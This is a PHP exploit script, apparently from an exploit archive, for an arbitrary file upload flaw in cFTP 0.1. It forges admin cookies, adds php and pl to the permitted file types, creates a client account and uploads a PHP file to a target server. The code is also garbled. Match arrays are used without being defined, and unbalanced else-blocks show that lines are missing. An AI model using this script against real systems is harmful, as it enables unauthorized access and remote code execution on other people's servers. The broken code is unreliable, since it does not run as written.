# Exploit Title: cFTP <= 0.1 (r80) Arbitrary File Upload
# Date: 2011-07-29
# Author: leviathan (vulnerability discovered by Simon Leblanc : <https://code.google.com/p/clients-oriented-ftp/issues/detail?id=78>)
# Software Link: https://code.google.com/p/clients-oriented-ftp/downloads/list
# Version: 0.1
# Tested on: linux
 
// Vulnerable URL
$url = &#039;http://[url domain]/cFTP/&#039;;
 
// The file to upload
$filename = dirname(__FILE__).&#039;/info.php&#039;;
 
 
$failext = array(&#039;php&#039;, &#039;pl&#039;);
$username = &#039;hackname&#039;.rand(0, 999999);
$cookies_injection = &#039;access=admin; userlevel=9&#039;; // <-- the big error of this app :-)
 
/**
 * Call URL
 */
function curl_call_url($url, $cookies_injection, $inputs = null)
{
  $curl = curl_init();
   
  curl_setopt($curl, CURLOPT_URL, $url);
  curl_setopt($curl, CURLOPT_HEADER, false);
  curl_setopt($curl, CURLOPT_POST, true);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($curl, CURLOPT_COOKIE, $cookies_injection);
   
  if (is_array($inputs) === true) {
    curl_setopt($curl, CURLOPT_POSTFIELDS, $inputs);
  }
   
  $response = curl_exec($curl);
  $headers = curl_getinfo($curl);
  $error_number   = curl_errno($curl);
  $error_message  = curl_error($curl);
   
  curl_close($curl);
   
  return array($response, $headers, $error_number, $error_message);
}
 
// Add vulnerable extensions (php, pl : defined in $failext)
list($response, $headers, $error_number, $error_message) = curl_call_url($url.&#039;options.php&#039;, $cookies_injection);
 
  $input = array();
  $count = count($matches[0]);
  for ($i = 0; $i < $count; $i++) {
    $input[$matches[2][$i]] = $matches[4][$i];
    if ($matches[2][$i] === &#039;allowed_file_types&#039;) {
      foreach ($failext as $ext) {
        if (strpos($matches[4][$i], $ext) === false) {
          $input[$matches[2][$i]] .= &#039;,&#039;.$ext;
        }
      }
      $input[$matches[2][$i]] = str_replace(&#039;,&#039;, &#039;|&#039;, $input[$matches[2][$i]]);
    }
  }
   
  // add select
    $input[&#039;timezone&#039;] = $matches[1];
  } else {
    $input[&#039;timezone&#039;] = &#039;America/Argentina/Buenos_Aires&#039;;
  }
   
  // Validate the form to add the vulnerables extensions
  list($response, $headers, $error_number, $error_message) = curl_call_url($url.&#039;options.php&#039;, $cookies_injection, $input);
   
  if (strpos($response, &#039;message_ok&#039;) !== false) {
    // Add new client : required to upload the file
    $input = array(
      &#039;add_client_form_name&#039; => $username,
      &#039;add_client_form_user&#039; => $username,
      &#039;add_client_form_pass&#039; => &#039;hackname&#039;,
      &#039;add_client_form_pass2&#039; => &#039;hackname&#039;,
      &#039;add_client_form_address&#039; => &#039;my address&#039;,
      &#039;add_client_form_phone&#039; => &#039;000-000-000&#039;,
      //&#039;add_client_form_notify&#039; => &#039;0&#039;,
      &#039;add_client_form_email&#039; => $username.&#039;@example.com&#039;,
      &#039;add_client_form_intcont&#039; => &#039;&#039;,
      &#039;Submit&#039; => &#039;Create account&#039;,
    );
     
    list($response, $headers, $error_number, $error_message) = curl_call_url($url.&#039;clientform.php&#039;, $cookies_injection, $input);
     
    if (strpos($response, &#039;message_ok&#039;) !== false) {
      // Now upload file :-)
      $input = array(
        &#039;name&#039; => &#039;my_hack_file&#039;,
        &#039;description&#039; => &#039;It\&#039;s my hack file&#039;,
        &#039;clientname&#039; => $username,
        &#039;ufile&#039; => &#039;@&#039;.$filename,
        &#039;Submit&#039; => &#039;Upload&#039;,
      );
       
      list($response, $headers, $error_number, $error_message) = curl_call_url($url.&#039;fileupload.php&#039;, $cookies_injection, $input);
       
        // get filename
        list($response, $headers, $error_number, $error_message) = curl_call_url($url.$matches[1], $cookies_injection);
         
          echo &#039;Your file is here : &#039;.$url.$matches[1].$matches_end[1].basename($filename);
        } else {
          var_dump($response);
          echo &#039;fail to hack : where is the file !!!&#039;;
        }
      } else {
        var_dump($response);
        echo &#039;fail to hack : file not uploaded&#039;;
      }
    } else {
      var_dump($response);
      echo &#039;fail to hack : client not created&#039;;
    }
     
  } else {
    var_dump($response);
    echo &#039;fail to hack : options not changed&#039;;
  }
   
} else {
  var_dump($response);
  echo &#039;fail to hack : no input&#039;;
}



